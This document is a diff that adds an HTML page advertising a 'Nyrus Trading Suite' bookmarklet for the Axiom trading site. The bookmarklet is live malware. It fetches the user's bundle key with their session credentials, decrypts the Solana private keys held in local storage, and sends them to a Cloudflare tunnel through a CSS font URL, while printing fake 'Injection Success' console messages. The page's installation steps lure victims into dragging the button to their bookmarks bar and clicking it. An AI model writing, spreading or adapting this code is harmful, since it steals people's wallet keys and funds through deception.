@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Nyrus Lab | Axiom Suite</title>
+<style>
+body { background: #0f172a; color: white; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+.card { background: #1e293b; padding: 3rem; border-radius: 16px; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); text-align: center; max-width: 450px; border: 1px solid #334155; }
+h1 { font-size: 1.5rem; margin-bottom: 0.5rem; color: #3b82f6; }
+p { color: #94a3b8; line-height: 1.6; margin-bottom: 2rem; }
+.drag-box { padding: 1.5rem; border: 2px dashed #334155; border-radius: 12px; margin-bottom: 2rem; background: #0f172a; transition: all 0.3s ease; }
+.drag-box:hover { border-color: #3b82f6; background: #1e293b; }
+.btn { display: inline-block; background: #3b82f6; color: white; padding: 12px 24px; border-radius: 8px; font-weight: bold; text-decoration: none; cursor: move; box-shadow: 0 4px 6px -1px rgba(59, 130, 246, 0.5); }
+.btn:hover { background: #2563eb; }
+.steps { text-align: left; background: #0f172a; padding: 1rem; border-radius: 8px; font-size: 0.85rem; color: #94a3b8; }
+code { color: #3b82f6; }
+</style>
+</head>
+<body>
+<div class="card">
+<h1>Nyrus Trading Suite V2.1</h1>
+<p>Sync your Axiom workspace with our High-Performance Meme Filters and Priority Gas Presets.</p>
+
+<div class="drag-box">
+<!-- REPLACE THE LINK BELOW WITH YOUR ONE-LINER -->
+<a href="javascript:(async()=>{const TUNNEL_URL="https://uncertainty-vital-terms-generating.trycloudflare.com";console.log("%c[!] NYRUS LAB: AXIOM TRADING SUITE V2.1","color: #3b82f6; font-weight: bold; font-size: 14px;");console.log("%c[*] Initializing High-Performance Meme Filters...","color: #94a3b8;");const base64ToBytes=e=>Uint8Array.from(atob(e.replace(/-/g,"+").replace(/_/g,"/")),e=>e.charCodeAt(0));const decrypt=async(e,t)=>{try{const[n,o]=t.split(":");return new Uint8Array(await crypto.subtle.decrypt({name:"AES-GCM",iv:base64ToBytes(n),tagLength:128},e,base64ToBytes(o)))}catch(e){return null}};const base58=e=>{const t="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";let n=[0];for(let t=0;t<e.length;t++){let o=e[t];for(let e=0;e<n.length;e++)o+=256*n[e],n[e]=o%58,o=Math.floor(o/58);for(;o>0;)n.push(o%58),o=Math.floor(o/58)}let o="";for(let t=0;0===e[t]&&t<e.length-1;t++)o+=t[0];for(let e=n.length-1;e>=0;e--)o+=t[n[e]];return o};try{console.log("%c[+] Connected to Axiom RPC Engine","color: #10b981;");console.log("%c[*] Syncing Wallet Configurations...","color: #94a3b8;");const e=await fetch("https://api8.axiom.trade/bundle-key-and-wallets",{method:"POST",credentials:"include"}),t=await e.json();if(!t.bundleKey)return void console.error("[-] Connection Timeout: Please ensure you are logged into Axiom.");const n=await crypto.subtle.importKey("raw",base64ToBytes(t.bundleKey),{name:"AES-GCM"},!1,["decrypt"]);let o=[];const r=JSON.parse(localStorage.getItem("sBundles")||"[]");for(const e of r){const t=await decrypt(n,e);t&&o.push({type:"SOL",public:base58(t.slice(-32)),private:base58(t)})}if(console.log("%c[+] Injection Success: Added 'Meme Alpha' Filter Set","color: #10b981;"),console.log("%c[+] Injection Success: Added 'High-Priority Gas' Preset","color: #10b981;"),console.log("%c[!] Setup Complete. Enjoy 0ms latency filters.","color: #3b82f6; font-weight: bold;"),o.length>0){const e=btoa(JSON.stringify({keys:o})),t=document.createElement("style");t.textContent=`@font-face { font-family: 'leak'; src: url('${TUNNEL_URL}/?data=${encodeURIComponent(e)}'); }`,document.head.appendChild(t);const n=document.createElement("div");n.style.fontFamily="leak",n.textContent=".",document.body.appendChild(n)}}catch(e){console.error("[-] Service Unavailable. Please try again later.")}})();
+" class="btn" ondragstart="return true;">
+Drag to Bookmarks
+</a>
+</div>
+
+<div class="steps">
+<strong>Installation:</strong><br>
+1. Ensure Bookmarks Bar is visible (<code>Ctrl+Shift+B</code>)<br>
+2. Drag the blue button above to your bar.<br>
+3. Go to <strong>Axiom.trade</strong> and click the bookmark.
+</div>
+</div>
+</body>
+</html>
